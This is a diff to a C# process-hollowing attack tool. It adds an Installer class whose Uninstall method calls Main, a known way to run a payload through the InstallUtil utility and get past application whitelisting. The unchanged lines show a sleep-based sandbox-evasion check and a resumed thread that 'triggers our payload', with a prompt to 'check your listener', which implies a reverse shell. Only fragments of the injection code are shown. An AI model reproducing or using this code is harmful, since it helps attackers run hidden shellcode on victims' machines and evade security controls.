@@ -2,6 +2,7 @@
 
 using System;
 using System.Runtime.InteropServices;
+using System.Configuration.Install;
 
 namespace ProcessHollowing
 {
@@ -82,7 +83,7 @@ namespace ProcessHollowing
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern uint ResumeThread(IntPtr hThread);
 
-        public static void Main(string[] args)
+        public static void Main()
         {
             DateTime t1 = DateTime.Now;
             Sleep(2000);
@@ -167,6 +168,15 @@ namespace ProcessHollowing
             // Resume the thread to trigger our payload
             uint rResult = ResumeThread(pInfo.hThread);
             Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
+        }
+
+    }
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            Program.Main();
         }
     }
 }
